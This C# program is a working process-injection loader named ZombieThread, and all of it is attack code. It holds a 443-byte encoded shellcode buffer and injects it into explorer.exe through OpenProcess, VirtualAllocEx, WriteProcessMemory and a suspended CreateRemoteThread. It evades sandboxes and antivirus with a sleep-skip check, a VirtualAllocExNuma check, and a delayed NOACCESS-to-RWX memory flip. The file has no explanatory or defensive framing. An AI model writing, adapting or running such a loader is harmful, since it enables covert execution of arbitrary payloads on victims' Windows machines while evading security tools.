using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ZombieThread
{
    class Program
    {
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
 
            byte[] buf = new byte[443] {0xba,0x81,0xc3,0x34,0xa8,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,
            0x69,0x31,0x56,0x12,0x83,0xc6,0x04,0x03,0xd7,0xcd,0xd6,0x5d,0x6d,0x40,0xa5,
            0xc3,0x8f,0xba,0x20,0x22,0xdb,0x18,0x41,0x8d,0x08,0xa8,0x18,0x4c,0xcd,0xea,
            0x5f,0xa0,0x81,0xe5,0x5c,0x92,0xbf,0xab,0xca,0xd6,0xce,0x07,0x2c,0x0a,0xb5,
            0x49,0xa5,0x5a,0x3f,0x62,0xb9,0x82,0xa2,0x90,0xe5,0x02,0x02,0x58,0xf8,0x33,
            0x4f,0x54,0x67,0x10,0xe7,0x6c,0xd1,0xcc,0xdd,0xfb,0x4b,0x34,0xce,0xb3,0x90,
            0xef,0x87,0xb8,0x08,0x90,0x0b,0x43,0xe5,0x7c,0x50,0x62,0xad,0x0d,0x73,0x62,
            0xc4,0xd5,0xcc,0x3b,0x0b,0x15,0x87,0x4c,0xa0,0xc4,0xe3,0xe3,0xed,0x43,0xe7,
            0xbc,0x22,0xfa,0xf6,0x16,0xa3,0xe5,0x30,0xad,0xb5,0x27,0x2c,0x1f,0xb2,0xc6,
            0xa6,0xcb,0xb0,0x58,0xe7,0x4f,0xaa,0x7c,0x15,0x22,0xe0,0x38,0xe9,0x50,0x9e,
            0x51,0x15,0x11,0x97,0xa4,0xb4,0x69,0xd9,0x24,0x02,0x9c,0x84,0x72,0x90,0xcb,
            0xc7,0x86,0x76,0x73,0x23,0xf2,0xb1,0xd4,0x14,0x68,0xc0,0x7b,0xe9,0xed,0x30,
            0xc2,0xa0,0x67,0x3e,0x5c,0x78,0xc3,0x1f,0xc8,0x02,0xb7,0x7c,0x52,0xa6,0x36,
            0xea,0x78,0x67,0x46,0xef,0x89,0xef,0xaf,0xa1,0x07,0x80,0x2f,0xaf,0x1d,0xca,
            0x76,0x5a,0xe5,0xe7,0xcd,0x62,0xf7,0x90,0x8e,0x19,0x08,0x0e,0x68,0x39,0x1a,
            0x30,0x32,0x74,0xef,0x97,0xb3,0x88,0xca,0x4e,0x6d,0x3b,0x2f,0x79,0xd5,0x43,
            0x4a,0x49,0x92,0x41,0x77,0x40,0xe1,0xdc,0xb9,0x36,0xc5,0x99,0xfa,0x6f,0x1b,
            0x92,0xef,0x91,0x28,0x98,0x1d,0xcb,0xe4,0x2e,0xc8,0x5e,0x9d,0x9b,0xef,0x54,
            0xb9,0x53,0xa0,0x95,0x82,0x0e,0xdb,0x4e,0x92,0x85,0xbd,0x66,0xce,0x8c,0x12,
            0x10,0x10,0x13,0xdb,0x86,0xfa,0xd8,0x07,0xe6,0x76,0xaf,0x0b,0x4a,0x90,0xde,
            0x0e,0xa6,0x91,0xb2,0x94,0x82,0x5d,0xab,0xd4,0x0a,0x99,0x87,0xb1,0xda,0x9b,
            0xcf,0x50,0x5b,0x93,0x3f,0xdd,0x4a,0x30,0x86,0x4f,0x08,0x47,0xaf,0xbc,0xee,
            0x40,0x9e,0x42,0xbc,0x0d,0xba,0xc6,0x78,0x36,0xe0,0x15,0xf5,0x79,0x6d,0xe1,
            0x25,0xfc,0xbc,0xae,0x88,0x77,0x7b,0x5d,0x25,0x88,0x40,0x6a,0x46,0x90,0xc4,
            0x0c,0xeb,0xc7,0x6f,0xc7,0xc6,0xd2,0x87,0x65,0x2d,0xbd,0x64,0x9d,0x94,0xa2,
            0xd1,0x91,0xfc,0x6e,0xa2,0x19,0x39,0x77,0xb9,0x1b,0x16,0x3b,0xfa,0x27,0xd8,
            0xe1,0x23,0x1e,0x05,0x7c,0xc2,0xe9,0x01,0x91,0x33,0x82,0xd9,0x60,0x70,0xf0,
            0x3d,0x9e,0xd0,0x27,0xa5,0xf2,0x82,0xa7,0x35,0x52,0xa3,0x6f,0xf2,0xa8,0xfd,
            0x84,0xcb,0x7e,0xce,0x75,0xff,0xdd,0x8d,0x9b,0x27,0x55,0x70,0x4e,0x81,0x9d,
            0xcf,0x55,0xb9,0xc7,0xb0,0x40,0x81,0xb2 };


            IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;

            int pid = Process.GetProcessesByName("explorer")[0].Id;

            hProcess = OpenProcess(0x001F0FFF, false, pid);

            addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            VirtualProtectEx(hProcess, addr, (UIntPtr)buf.Length, 0x01, out uint lpflOldProtect);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);

            System.Threading.Thread.Sleep(20000);

            VirtualProtectEx(hProcess, addr, (UIntPtr)buf.Length, 0x40, out lpflOldProtect);
        
            ResumeThread(hThread);

        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
    }
}
